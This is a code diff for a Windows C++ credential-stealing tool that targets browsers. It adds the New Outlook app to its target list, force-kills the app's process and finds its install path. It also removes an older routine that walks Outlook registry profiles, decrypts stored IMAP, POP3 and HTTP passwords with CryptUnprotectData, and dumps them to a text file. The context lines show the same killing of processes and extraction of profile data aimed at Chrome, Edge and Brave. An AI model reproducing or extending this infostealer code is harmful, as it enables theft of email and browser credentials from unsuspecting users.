@@ -51,6 +51,16 @@ void extract_outlook_data();
 int main() {
     std::vector<BrowserConfig> configs = {
         {
+            "New Outlook",
+            "olk.exe",
+            {L"C:\\Program Files\\WindowsApps\\Microsoft.OutlookForWindows_8wekyb3d8bbwe\\olk.exe"},
+            "msedge.dll",
+            {L"Microsoft", L"Olk", L"EBWebView"},
+            "outlook_extract",
+            "outlook_tmp",
+            true, false, true
+        },
+        {
             "Google Chrome",
             "chrome.exe",
             {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"},
@@ -102,6 +112,7 @@ int main() {
         }
     };
 
+    kill_processes_by_name("olk.exe");
     kill_processes_by_name("chrome.exe");
     kill_processes_by_name("msedge.exe");
     kill_processes_by_name("brave.exe");
@@ -124,6 +135,15 @@ int main() {
         }
 
         if (exe_path.empty()) {
+            // Check for New Outlook user path
+            if (config.name == "New Outlook") {
+                wchar_t* localAppData;
+                if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppData) == S_OK) {
+                    std::wstring outlookPath = std::wstring(localAppData) + L"\\Microsoft\\WindowsApps\\olk.exe";
+                    CoTaskMemFree(localAppData);
+                    if (fs::exists(outlookPath)) exe_path = outlookPath;
+                }
+            }
             // Check for Opera user path
             if (config.name.find("Opera") != std::string::npos) {
                 wchar_t* localAppData;
@@ -188,8 +208,6 @@ int main() {
             std::cerr << "Failed to create " << config.name << " process. Error: " << GetLastError() << std::endl;
         }
     }
-
-    extract_outlook_data();
 
     return 0;
 }
@@ -799,31 +817,6 @@ void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const Browse
 }
 
 
-std::string decrypt_outlook_password(const BYTE* data, DWORD size) {
-    if (!data || size == 0) return "";
-    DATA_BLOB input = { size, (BYTE*)data };
-    DATA_BLOB output = { 0, NULL };
-    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
-        std::wstring w_pass((wchar_t*)output.pbData, output.cbData / sizeof(wchar_t));
-        std::string pass(w_pass.begin(), w_pass.end());
-        LocalFree(output.pbData);
-        // Remove trailing null if any
-        if (!pass.empty() && pass.back() == '\0') pass.pop_back();
-        return pass;
-    }
-    return "";
-}
-
-std::string get_reg_string(HKEY h_key, LPCWSTR value_name) {
-    wchar_t buffer[512];
-    DWORD size = sizeof(buffer);
-    if (RegQueryValueExW(h_key, value_name, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
-        std::wstring w_str = buffer;
-        return std::string(w_str.begin(), w_str.end());
-    }
-    return "";
-}
-
 std::string to_narrow_string(const wchar_t* w_str) {
     if (!w_str) return "";
     int size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, NULL, 0, NULL, NULL);
@@ -832,95 +825,5 @@ std::string to_narrow_string(const wchar_t* w_str) {
     WideCharToMultiByte(CP_UTF8, 0, w_str, -1, &res[0], size, NULL, NULL);
     if (!res.empty() && res.back() == '\0') res.pop_back();
     return res;
-}
-
-std::string get_reg_binary_string(HKEY h_key, LPCWSTR value_name) {
-    BYTE buffer[1024];
-    DWORD size = sizeof(buffer);
-    DWORD type = 0;
-    if (RegQueryValueExW(h_key, value_name, NULL, &type, buffer, &size) == ERROR_SUCCESS) {
-        if (type == REG_BINARY) {
-            std::wstring w_str((wchar_t*)buffer, size / sizeof(wchar_t));
-            return to_narrow_string(w_str.c_str());
-        }
-    }
-    return "";
-}
-
-void extract_outlook_data() {
-    fs::path output_dir("outlook_extract");
-    fs::create_directories(output_dir);
-    std::ofstream ofs(output_dir / "outlook_accounts.txt");
-
-    const wchar_t* base_path = L"Software\\Microsoft\\Office";
-    const wchar_t* versions[] = { L"15.0", L"16.0" };
-    const wchar_t* outlook_guid = L"9375CFF0413111d3B88A00104B2A6676";
-
-    HKEY h_base_key;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Office", 0, KEY_READ, &h_base_key) != ERROR_SUCCESS) return;
-
-    for (const auto& version : versions) {
-        std::wstring profiles_path = std::wstring(version) + L"\\Outlook\\Profiles";
-        HKEY h_profiles_key;
-        if (RegOpenKeyExW(h_base_key, profiles_path.c_str(), 0, KEY_READ, &h_profiles_key) == ERROR_SUCCESS) {
-            wchar_t profile_name[256];
-            DWORD profile_name_size = 256;
-            for (DWORD i = 0; RegEnumKeyExW(h_profiles_key, i, profile_name, &profile_name_size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS; ++i) {
-                HKEY h_profile_key;
-                if (RegOpenKeyExW(h_profiles_key, profile_name, 0, KEY_READ, &h_profile_key) == ERROR_SUCCESS) {
-                    HKEY h_guid_key;
-                    if (RegOpenKeyExW(h_profile_key, outlook_guid, 0, KEY_READ, &h_guid_key) == ERROR_SUCCESS) {
-                        wchar_t account_idx[256];
-                        DWORD account_idx_size = 256;
-                        for (DWORD j = 0; RegEnumKeyExW(h_guid_key, j, account_idx, &account_idx_size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS; ++j) {
-                            HKEY h_account_key;
-                            if (RegOpenKeyExW(h_guid_key, account_idx, 0, KEY_READ, &h_account_key) == ERROR_SUCCESS) {
-                                std::string email = get_reg_string(h_account_key, L"Email");
-                                if (email.empty()) email = get_reg_binary_string(h_account_key, L"001f6641");
-
-                                std::string smtp = get_reg_string(h_account_key, L"SMTP Server");
-                                if (smtp.empty()) smtp = get_reg_binary_string(h_account_key, L"001f6641"); // Common fallback tags
-
-                                std::string imap = get_reg_string(h_account_key, L"IMAP Server");
-                                if (imap.empty()) imap = get_reg_binary_string(h_account_key, L"001f662b");
-
-                                std::string user = get_reg_string(h_account_key, L"IMAP User");
-                                if (user.empty()) user = get_reg_binary_string(h_account_key, L"001f662b");
-
-                                if (!email.empty() || !smtp.empty()) {
-                                    ofs << "[" << "Software\\Microsoft\\Office\\" << to_narrow_string(version) << "\\Outlook\\Profiles\\" << to_narrow_string(profile_name) << "\\" << to_narrow_string(outlook_guid) << "\\" << to_narrow_string(account_idx) << "]\n";
-                                    if (!email.empty()) ofs << "  Email: " << email << "\n";
-                                    if (!smtp.empty()) ofs << "  SMTP Server: " << smtp << "\n";
-                                    if (!imap.empty()) ofs << "  IMAP Server: " << imap << "\n";
-                                    if (!user.empty()) ofs << "  User: " << user << "\n";
-
-                                    const wchar_t* pass_values[] = { L"IMAP Password", L"POP3 Password", L"HTTP Password", L"001f6641" };
-                                    for (const auto& pass_val : pass_values) {
-                                        BYTE pass_data[2048];
-                                        DWORD pass_size = sizeof(pass_data);
-                                        if (RegQueryValueExW(h_account_key, pass_val, NULL, NULL, pass_data, &pass_size) == ERROR_SUCCESS) {
-                                            std::string decrypted = decrypt_outlook_password(pass_data, pass_size);
-                                            if (!decrypted.empty()) {
-                                                ofs << "  Password (" << to_narrow_string(pass_val) << "): " << decrypted << "\n";
-                                            }
-                                        }
-                                    }
-                                    ofs << "------------------------------------------\n";
-                                }
-                                RegCloseKey(h_account_key);
-                            }
-                            account_idx_size = 256;
-                        }
-                        RegCloseKey(h_guid_key);
-                    }
-                    RegCloseKey(h_profile_key);
-                }
-                profile_name_size = 256;
-            }
-            RegCloseKey(h_profiles_key);
-        }
-    }
-    RegCloseKey(h_base_key);
-    std::cout << "Outlook extraction complete. Data saved in outlook_extract/outlook_accounts.txt" << std::endl;
 }
 // Final check
